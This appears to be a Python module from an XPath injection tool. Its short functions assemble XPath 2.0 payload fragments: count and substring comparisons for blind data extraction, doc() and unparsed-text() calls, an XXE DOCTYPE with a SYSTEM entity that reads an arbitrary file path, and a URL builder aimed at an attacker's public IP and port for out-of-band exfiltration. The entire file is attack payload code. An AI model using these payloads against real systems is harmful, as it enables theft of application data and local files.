def count(_xpath,         _i):  # 1
    return "count(%s)<=%i" % (_xpath,          _i)
#-------------------------------------------------------------------------------


def string_length(_xpath,         _i):  # 2
    return "string-length(%s)<=%i" % (_xpath,          _i)
#-------------------------------------------------------------------------------


def substring(_xpath,         _i,                 _char):  # 3
    return "substring(%s,%i,1)={tag}%s{tag}" % (_xpath,  _i,             _char)
#-------------------------------------------------------------------------------


def doc(_string):  # 48**8
    return "doc(%s)" % (_string)
#-------------------------------------------------------------------------------


def unparsed_text(_string):  # 5
    return "unparsed-text({tag}%s{tag})" % (_string)
#-------------------------------------------------------------------------------


def reverse(_i):  # 6
    return "reverse(-%i to %i)=0" % (_i,              _i)
#-------------------------------------------------------------------------------


def concat2(_first_string,  _second_string):  # 7
    return "concat(%s,%s)" % (_first_string,   _second_string)
#-------------------------------------------------------------------------------


def concat3(_first_string,  _second_string,     _third_string):  # 8
    return "concat(%s,%s,%s)" % (_first_string,   _second_string, _third_string)


#-------------------------------------------------------------------------------
using_doc = "base-uri()"  # 9
#-------------------------------------------------------------------------------


def encode_for_uri(_string):  # 10
    return "encode-for-uri(%s)" % (_string)
#-------------------------------------------------------------------------------


def simple_count(_xpath):  # 11
    return "count(%s)" % (_xpath)
#-------------------------------------------------------------------------------


def if_then(_first_string,  _second_string):  # 12
    return "(if (%s) then %s else 1=1)" % (_first_string,   _second_string)
#-------------------------------------------------------------------------------


def string(_string):  # 13
    return "string(%s)" % (_string)
#-------------------------------------------------------------------------------


def xxe_doc(_file_path):  # 14
    return doc('{tag1}<?xml version={tag}1.0{tag} encoding={tag}UTF-8{tag} ?>'
               + '<!DOCTYPE input [<!ELEMENT input (#PCDATA)>'
               + '<!ENTITY c SYSTEM {tag}%s{tag} >]>' % (_file_path)
               + '<input>&amp;c;</input>{tag1}')
#-------------------------------------------------------------------------------


def url(_public_ip,  _port):  # 15
    return "{tag}http://%s:%s/{tag}" % (_public_ip,      _port)
#-------------------------------------------------------------------------------


def more_then(_xpath):  # 16
    return "count(%s)>0" % (_xpath)
